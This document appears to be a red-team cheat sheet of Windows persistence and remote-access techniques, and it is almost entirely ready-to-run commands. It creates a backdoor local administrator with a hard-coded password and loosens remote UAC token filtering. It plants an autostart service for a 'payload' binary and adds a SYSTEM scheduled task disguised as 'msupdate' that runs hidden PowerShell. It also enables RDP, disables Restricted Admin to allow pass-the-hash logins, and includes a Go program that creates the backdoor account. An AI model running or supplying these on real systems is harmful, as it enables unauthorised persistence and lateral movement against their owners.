# Windows

### Create new user

```powershell
net user mylocaladmin p@ssw0rd! /add /expires:never
net localgroup administrators mylocaladmin /add
```

Create user **mylocaladmin** with password **p@ssw0rd!** and add it to **administrators** group.



Change registry settings to allow local administrator accounts to perform administrative tasks remotely without restrictions

```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```



### Create service

_Make a service, with autostart. Before need prepare special payload, that is a service binary._&#x20;

```
sc.exe create "monitexp" binPath= "C:\PathToServiceBinary" type= own start= auto
```

_Then start service_

```
Start-Service -Name "monitexp"
```

### Scheduled task

#### schtasks.exe

_Task create:_

```
schtasks /create /tn msupdate /tr "powershell -w h calc.exe" /sc MINUTE /mo 5 /f /ru SYSTEM
```

Task info

```
schtasks /query /tn msupdate /v /fo list
```

Force the task to start_:_

```
schtasks /run /tn msupdate /i
```

_Delete task:_

```
schtasks /delete /tn msupdate /f
```



### Provide RDP access

#### Turn on RDP

```powershell
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

#### Bypass Restricted Admin Mode&#x20;

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

#### Connect

```powershell
xfreerdp /v:172.16.222.254 /u:username /pth:<NT_HASH> /dynamic-resolution +clipboard
```

### Go based binary to create local admin

```go
package main

import (
	"fmt"
	"log"
	"os/exec"
)

func main() {
	addUserCmd := "net user mylocaladmin p@ssw0rd! /add /expires:never"
	addToAdminGroupCmd := "net localgroup administrators mylocaladmin /add"

	err := executeCommand(addUserCmd)
	if err != nil {
		log.Fatal(err)
	}

	err = executeCommand(addToAdminGroupCmd)
	if err != nil {
		log.Fatal(err)
	}

}

func executeCommand(command string) error {
	cmd := exec.Command("cmd", "/C", command)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("err: %s\noutput : %s", err, output)
	}
	return nil
}

```
